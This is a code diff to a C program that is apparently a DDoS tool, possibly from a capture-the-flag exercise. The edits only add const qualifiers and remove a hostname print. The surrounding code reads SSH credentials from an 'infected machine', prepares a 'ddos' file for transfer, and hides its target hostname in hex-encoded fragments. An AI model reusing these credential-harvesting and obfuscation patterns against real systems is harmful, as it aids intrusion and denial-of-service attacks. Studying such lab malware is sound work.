@@ -30,13 +30,13 @@ void displayTextArt() {
 )EOF");
 }
 
-long unsigned int special_secret_link() {
+size_t special_secret_link() {
     const char *link = "https://rb.gy/o411hk";
     return strlen(link);
 }
 
 void transfer() {
-    char *client_file_name = "ddos"; //path to the ddos file
+    const char *client_file_name = "ddos"; //path to the ddos file
 
     //open file with ssh credentials from infected machine 
     FILE *file = fopen("credentials_test.csv", "r");
@@ -134,14 +134,14 @@ void ddos(CURL *curl) {
 }
 
 void the_0bfusk1_666_h0sTn4m3(char *str) {
-    char *nbmpdibqer = "\x6C\x6D";
-    char *msdopzoinf = "\x6E\x61";
-    char *odbazmapwn = "\x2E\x63\x74\x66";
-    char *fjdoznvpzq = "\x68\x65";
-    char *vaedcvegvd = "\x73\x74";
-    char *foazuibcvi = "\x6C\x6C\x75\x78";
-    char *yzebxcpsuz = "\x61\x64";
-    char *nciuazbcvo = "\x68\x61";
+    const char *nbmpdibqer = "\x6C\x6D";
+    const char *msdopzoinf = "\x6E\x61";
+    const char *odbazmapwn = "\x2E\x63\x74\x66";
+    const char *fjdoznvpzq = "\x68\x65";
+    const char *vaedcvegvd = "\x73\x74";
+    const char *foazuibcvi = "\x6C\x6C\x75\x78";
+    const char *yzebxcpsuz = "\x61\x64";
+    const char *nciuazbcvo = "\x68\x61";
 
     snprintf(str, 21, "%s%s%s%s%s%s%s%s",
              fjdoznvpzq,
@@ -171,8 +171,6 @@ int main(void) {
 
     char hostname[21];
     the_0bfusk1_666_h0sTn4m3(hostname); //ip to ddos
-
-    fprintf(stdout, "Hostname : %s\n", hostname);
 
     CURL *curl = get_curl(hostname);
 
